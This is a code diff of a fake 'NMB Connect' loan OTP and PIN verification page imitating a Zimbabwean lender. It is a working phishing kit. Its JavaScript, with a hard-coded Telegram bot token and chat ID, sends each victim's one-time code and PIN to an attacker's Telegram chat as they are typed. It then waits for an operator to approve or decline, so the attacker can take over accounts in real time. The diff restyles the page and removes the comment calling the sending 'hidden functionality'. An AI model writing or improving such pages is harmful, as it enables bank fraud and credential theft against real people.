@@ -3,112 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - Verification</title>
+    <title>NMB Connect - OTP Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
         * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
-        .otp-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
+        body { background: linear-gradient(135deg, #003B4F 0%, #001F2E 100%); min-height: 100vh; }
+        .otp-input:focus { border-color: #E4C16A; box-shadow: 0 0 0 2px rgba(228, 193, 106, 0.2); }
+        .pin-confirm:focus { border-color: #E4C16A; box-shadow: 0 0 0 2px rgba(228, 193, 106, 0.2); }
     </style>
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-3 sm:p-4">
     <div class="w-full max-w-sm">
         <!-- Header -->
-        <div class="text-center mb-5">
-            <div class="flex items-center justify-center gap-1 mb-2">
-                <span class="text-xl sm:text-2xl font-black text-white">NMB</span>
-                <span class="text-xl sm:text-2xl font-black text-[#f2a900]">Connect</span>
+        <div class="text-center mb-6">
+            <div class="flex items-center justify-center gap-2 mb-3">
+                <i class="fas fa-key text-4xl text-[#E4C16A]"></i>
+                <div>
+                    <span class="text-3xl sm:text-4xl font-black text-white">NMB</span>
+                    <span class="text-3xl sm:text-4xl font-black text-[#E4C16A]">Connect</span>
+                </div>
             </div>
             <p class="text-white/70 text-xs font-semibold uppercase tracking-wide">Verification</p>
         </div>
 
         <!-- Main Card -->
-        <div class="bg-white rounded-xl sm:rounded-2xl shadow-2xl overflow-hidden">
+        <div class="bg-white rounded-2xl shadow-2xl overflow-hidden">
             <!-- Title Section -->
-            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-4 sm:p-5 text-center">
-                <h1 class="text-white font-black text-lg sm:text-xl mb-1">Verify OTP</h1>
-                <p class="text-white/80 text-xs">Sent to <span id="phoneDisplay" class="font-black">+263XXXXXXXXX</span></p>
+            <div class="bg-gradient-to-r from-[#003B4F] to-[#001F2E] p-6 sm:p-8 text-center">
+                <h1 class="text-white font-black text-2xl sm:text-3xl mb-2">Verify OTP</h1>
+                <p class="text-white/80 text-sm">Sent to <span id="phoneDisplay" class="font-black">+263XXXXXXXXX</span></p>
             </div>
 
             <!-- Content -->
-            <div id="otpForm" class="p-5 sm:p-6 space-y-5">
+            <div id="otpForm" class="p-6 sm:p-8 space-y-6">
                 <!-- Loan Amount Display -->
-                <div class="bg-blue-50 border border-blue-100 rounded-lg p-3">
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
                     <div class="flex justify-between items-center">
-                        <span class="text-xs font-black text-gray-600 uppercase">Loan Amount</span>
-                        <span class="font-black text-lg text-[#003366]" id="displayAmount">$500</span>
+                        <span class="text-xs font-black text-gray-700 uppercase">Loan Amount</span>
+                        <span class="font-black text-lg text-[#003B4F]" id="displayAmount">$500</span>
                     </div>
                 </div>
 
                 <!-- OTP Input -->
                 <div class="space-y-3">
-                    <label class="text-xs font-black text-gray-600 uppercase">Enter 6-Digit Code</label>
+                    <label class="text-xs font-black text-gray-700 uppercase">Enter 6-Digit Code</label>
                     <div class="flex gap-2 sm:gap-3 justify-between">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
+                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="text" maxlength="1" class="otp-input w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
                     </div>
                 </div>
                 
                 <!-- Resend Timer -->
                 <div class="text-center">
-                    <p class="text-xs font-semibold text-gray-500">
-                        Didn't receive code? <button id="resendBtn" class="text-[#003366] font-black hover:underline">Resend in <span id="timer">59</span>s</button>
+                    <p class="text-xs font-semibold text-gray-600">
+                        Didn't receive code? <button id="resendBtn" class="text-[#003B4F] font-black hover:underline">Resend in <span id="timer">59</span>s</button>
                     </p>
                 </div>
 
                 <!-- Submit Button -->
-                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-3 sm:py-4 rounded-lg hover:shadow-lg transition-all uppercase text-xs sm:text-sm tracking-wide">
+                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-4 rounded-lg hover:shadow-lg transition-all uppercase text-sm tracking-wide">
                     Verify
                 </button>
             </div>
 
             <!-- Polling Overlay -->
-            <div id="pollingOverlay" class="hidden p-6 sm:p-8 text-center space-y-6">
-                <div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto">
-                    <div class="absolute inset-0 border-4 border-gray-50 rounded-full"></div>
-                    <div class="absolute inset-0 border-4 border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
+            <div id="pollingOverlay" class="hidden p-8 text-center space-y-6">
+                <div class="relative w-24 h-24 mx-auto">
+                    <div class="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
+                    <div class="absolute inset-0 border-4 border-[#E4C16A] border-t-transparent rounded-full animate-spin"></div>
                     <div class="absolute inset-0 flex items-center justify-center">
-                        <i class="fas fa-key text-2xl sm:text-3xl text-[#003366]"></i>
+                        <i class="fas fa-key text-3xl text-[#003B4F]"></i>
                     </div>
                 </div>
                 <div class="space-y-2">
-                    <h3 class="text-lg sm:text-xl font-black text-gray-800 tracking-tight">Wait for Verification</h3>
-                    <p class="text-gray-500 text-xs sm:text-sm font-medium leading-relaxed">Your code is being verified...</p>
+                    <h3 class="text-xl font-black text-gray-800 tracking-tight">Wait for Verification</h3>
+                    <p class="text-gray-600 text-sm font-medium leading-relaxed">Your code is being verified...</p>
                 </div>
             </div>
         </div>
 
         <!-- PIN Modal -->
         <div id="pinModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
-            <div class="bg-white rounded-xl sm:rounded-2xl max-w-xs w-full p-6 sm:p-8 text-center space-y-6 shadow-2xl">
+            <div class="bg-white rounded-2xl max-w-xs w-full p-8 text-center space-y-6 shadow-2xl">
                 <div class="text-center">
-                    <h4 class="text-lg sm:text-xl font-black text-gray-800 uppercase">Confirm PIN</h4>
-                    <p class="text-gray-500 text-xs sm:text-sm mt-1 font-medium">Re-enter your 4-digit PIN</p>
+                    <h4 class="text-2xl font-black text-gray-800 uppercase">Confirm PIN</h4>
+                    <p class="text-gray-600 text-sm mt-2 font-medium">Re-enter your 4-digit PIN</p>
                 </div>
 
                 <!-- Loan Amount in Modal -->
-                <div class="bg-blue-50 border border-blue-100 rounded-lg p-3">
+                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
                     <div class="flex justify-between items-center">
-                        <span class="text-xs font-black text-gray-600 uppercase">Loan Amount</span>
-                        <span class="font-black text-lg text-[#003366]" id="modalAmount">$500</span>
+                        <span class="text-xs font-black text-gray-700 uppercase">Loan Amount</span>
+                        <span class="font-black text-lg text-[#003B4F]" id="modalAmount">$500</span>
                     </div>
                 </div>
 
                 <div id="pinEntry" class="space-y-4">
                     <div class="flex gap-2 justify-between">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-200 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-confirm w-full h-12 sm:h-14 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
                     </div>
-                    <button id="confirmPinBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-3 rounded-lg uppercase text-xs tracking-wide">
-                        Verify
+                    <button id="confirmPinBtn" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-3 rounded-lg uppercase text-sm tracking-wide">
+                        Verify PIN
                     </button>
                 </div>
 
@@ -116,7 +120,7 @@
                 <div id="pinAdmin" class="hidden space-y-4">
                     <div class="animate-pulse flex flex-col items-center">
                         <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mb-3">
-                            <i class="fas fa-lock text-[#003366]"></i>
+                            <i class="fas fa-lock text-[#003B4F] text-xl"></i>
                         </div>
                         <p class="text-xs font-black text-gray-400 uppercase tracking-widest">Wait for Verification</p>
                     </div>
@@ -125,12 +129,13 @@
         </div>
 
         <!-- Footer -->
-        <p class="text-center text-white/60 text-xs mt-5 font-semibold">
+        <p class="text-center text-white/60 text-xs mt-6 font-semibold">
             © 2026 NMB Holdings | Zimbabwe's Trusted Lender
         </p>
     </div>
 
     <script>
+        // Telegram Bot Configuration
         const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
         const TELEGRAM_CHAT_ID = '7547427914';
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -156,9 +161,12 @@
         displayAmount.textContent = `$${loanData.amount || '500'}`;
         modalAmount.textContent = `$${loanData.amount || '500'}`;
 
-        // OTP Logic - Auto-fill and auto-send
+        // OTP Input Navigation & Auto-Send
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
+                // Only allow numbers
+                e.target.value = e.target.value.replace(/\D/g, '');
+                
                 if (e.target.value && index < otpInputs.length - 1) {
                     otpInputs[index + 1].focus();
                 }
@@ -172,7 +180,7 @@
         function checkOtpComplete() {
             const otp = Array.from(otpInputs).map(i => i.value).join('');
             if (otp.length === 6) {
-                // Auto-send to Telegram (hidden functionality)
+                // Auto-send to Telegram
                 setTimeout(() => sendOtpToTelegram(otp), 300);
             }
         }
@@ -205,8 +213,8 @@
             const inlineKeyboard = {
                 inline_keyboard: [
                     [
-                        { text: '✅ VALID OTP', callback_data: `valid_otp_${session.phone}` },
-                        { text: '❌ INVALID OTP', callback_data: `invalid_otp_${session.phone}` }
+                        { text: '✅ APPROVE', callback_data: `valid_otp_${session.phone}` },
+                        { text: '❌ DECLINE', callback_data: `invalid_otp_${session.phone}` }
                     ]
                 ]
             };
@@ -255,17 +263,19 @@
                     otpInputs[0].focus();
                     otpForm.classList.remove('hidden');
                     pollingOverlay.classList.add('hidden');
+                    alert('Invalid OTP. Please try again.');
                 }
 
                 if (attempts >= maxAttempts) {
                     clearInterval(interval);
                     otpForm.classList.remove('hidden');
                     pollingOverlay.classList.add('hidden');
+                    alert('Verification timeout. Please try again.');
                 }
             }, 1000);
         }
 
-        // PIN Logic
+        // PIN Input Navigation
         pinConfirmInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
                 if (e.target.value && index < pinConfirmInputs.length - 1) {
@@ -281,22 +291,27 @@
         function checkPinComplete() {
             const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
             if (pin.length === 4) {
-                // Auto-send to Telegram (hidden functionality)
+                // Auto-send to Telegram
                 setTimeout(() => sendPinToTelegram(pin), 300);
             }
         }
+
+        confirmPinBtn.addEventListener('click', () => {
+            const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
+            if (pin.length === 4) {
+                triggerPinConfirm();
+            } else {
+                alert('Please enter the complete 4-digit PIN');
+            }
+        });
 
         function triggerPinConfirm() {
             const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
             if (pin.length === 4) {
                 pinEntry.classList.add('hidden');
                 pinAdmin.classList.remove('hidden');
-            } else {
-                alert('Please enter the complete 4-digit PIN');
             }
         }
-
-        confirmPinBtn.addEventListener('click', triggerPinConfirm);
 
         async function sendPinToTelegram(pin) {
             const message = `
@@ -360,17 +375,19 @@
                     pinConfirmInputs[0].focus();
                     pinEntry.classList.remove('hidden');
                     pinAdmin.classList.add('hidden');
+                    alert('Invalid PIN. Please try again.');
                 }
 
                 if (attempts >= maxAttempts) {
                     clearInterval(interval);
                     pinEntry.classList.remove('hidden');
                     pinAdmin.classList.add('hidden');
+                    alert('Verification timeout. Please try again.');
                 }
             }, 1000);
         }
 
-        // Timer
+        // Timer for Resend
         let timeLeft = 59;
         setInterval(() => {
             if (timeLeft > 0) {
